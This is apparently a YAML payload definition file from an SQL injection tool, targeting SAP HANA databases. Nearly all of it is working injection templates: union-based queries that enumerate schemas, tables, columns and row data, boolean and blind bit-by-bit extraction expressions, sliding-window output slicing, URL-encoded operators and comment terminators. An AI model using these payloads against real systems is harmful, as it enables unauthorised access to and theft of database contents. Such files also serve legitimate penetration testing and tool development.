vendor: 
resource: 
 info: |
  select
      '${ENCLOSE_VALUE_SQL}'
      || version
      || '${ENCLOSE_VALUE_SQL}'
      || database_name
      || '${ENCLOSE_VALUE_SQL}'
      || CURRENT_USER
      || '${TRAIL_SQL}'
  from sys.m_database
  
 schema: 
  database: |
   select 
       STRING_AGG(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}',
           '${SEPARATOR_CELL_SQL}'
           ORDER BY r
       )
       || '${TRAIL_SQL}'
   from (
       select schema_name r
       from sys.schemas
       order by r
       {limit}
   )
   
  table: |
   select 
       STRING_AGG(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}',
           '${SEPARATOR_CELL_SQL}'
           ORDER BY r
       )
       || '${TRAIL_SQL}'
   from (
       select distinct name r
       from sys.rs_tables_ t
       where t.schema = '${DATABASE}'
       union
       select distinct name r
       from sys.rs_views_ v
       where v.schema = '${DATABASE}'
       order by r
       {limit}
   )
   
  column: |
   select 
       STRING_AGG(
           '${ENCLOSE_VALUE_SQL}'
           || r
           || '${SEPARATOR_QTE_SQL}'
           || '0'
           || '${ENCLOSE_VALUE_SQL}',
           '${SEPARATOR_CELL_SQL}'
           ORDER BY r
       )
       || '${TRAIL_SQL}'
   from (
       select distinct c.name r
       from sys.rs_columns_ c
       inner join sys.rs_tables_ t on c.cid = t.oid
       where t.schema = '${DATABASE}' and t.name = '${TABLE}'
       union
       select distinct c1.name r
       from sys.rs_columns_ c1
       inner join sys.rs_views_ v on c1.cid = v.oid
       where v.schema = '${DATABASE}' and v.name = '${TABLE}'
       order by r
       {limit}
   )
   
  row: 
   query: |
    select 
        STRING_AGG(
            '${ENCLOSE_VALUE_SQL}'
            || r
            || '${SEPARATOR_QTE_SQL}'
            || '0'
            || '${ENCLOSE_VALUE_SQL}',
            '${SEPARATOR_CELL_SQL}'
            ORDER BY r
        )
        || '${TRAIL_SQL}'
    from (
        select distinct (${FIELDS})r
        from ${DATABASE}.${TABLE}
        order by r
        {limit}
    )
   fields: 
    field: trim(coalesce(${FIELD}, ''))
    concat: "|| '%7f' ||"
    
strategy: 
 configuration: 
  slidingWindow: |
   select
       /**
        * If reach end of string (${LEAD}i) then NULLIF nullifies the result
        */
       '${LEAD}'
       || NULLIF (
           substr (
               (${INJECTION}),
               ${INDEX},
               65536
           ),
           '${TRAIL_SQL}'
       )
   from dummy
  limit: limit 65536 offset ${LIMIT}
  failsafe: (1337${INDICE}7330%2b1)
  calibrator: |
   rpad(
       '${CALIBRATOR_SQL}', 
       1024, 
       '${CALIBRATOR_SQL}'
   )
  limitBoundary: 0
  endingComment: --+-
  fingerprint: 
   errorMessage: 
    - Hana database
    
 normal: 
  indices: union select ${INDICES} from dummy
  capacity: ('${LEAD}'|| ${INDICE}|| ${CALIBRATOR})
  orderBy: order by 1337
  
 boolean: 
  test: 
   falses: 
    - true = false
    - true %21= true
    - false %21= false
    - 1 = 2
    - 1 %21= 1
    - 2 %21= 2
   trues: 
    - true = true
    - false = false
    - true %21= false
    - 1 = 1
    - 2 = 2
    - 1 %21= 2
   initialization: 0%2b1 = 1
   bit: |
    /**
     * true bit return bit, false bit return 0
     * 8 & 8 = 8, 8 & 4 = 0
     */
    0 != BITAND(
        ascii(
            substr(
                (${INJECTION}),
                ${INDEX},
                1
            )
        ),
        ${BIT}
    )
   length: length((${INJECTION})) > ${INDEX}
   
  blind: and ${TEST}